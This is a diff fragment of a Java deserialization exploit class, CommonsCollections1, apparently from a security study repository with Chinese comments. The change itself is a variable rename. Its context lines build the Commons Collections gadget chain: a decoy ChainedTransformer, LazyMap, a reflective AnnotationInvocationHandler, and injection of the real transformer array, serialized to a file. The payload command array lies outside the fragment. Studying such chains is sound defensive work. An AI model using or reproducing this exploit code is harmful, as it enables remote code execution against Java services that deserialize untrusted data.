@@ -428,10 +428,10 @@ public class CommonsCollections1 {
         };
         // 创建虚假的调用链
         Transformer[] fakeTransformers = new Transformer[]{new ConstantTransformer(1)};
-        ChainedTransformer ChainedTransformer = new ChainedTransformer(fakeTransformers);
+        ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformers);
 
         Map innerMap = new HashMap<>();
-        Map outerMap = LazyMap.decorate(innerMap, ChainedTransformer);
+        Map outerMap = LazyMap.decorate(innerMap, chainedTransformer);
         // 获取AnnotationInvocationHandler类对象
         Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
         // 获取AnnotationInvocationHandler类的构造方法
@@ -444,7 +444,7 @@ public class CommonsCollections1 {
         // 将真正的利用链数组设置到ChainedTransformer里面的iTransformers字段值
         Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
         f.setAccessible(true);
-        f.set(ChainedTransformer, transformers);
+        f.set(chainedTransformer, transformers);
         FileOutputStream fileOutputStream = new FileOutputStream("1.txt");
         // 创建并实例化对象输出流
         ObjectOutputStream out = new ObjectOutputStream(fileOutputStream);
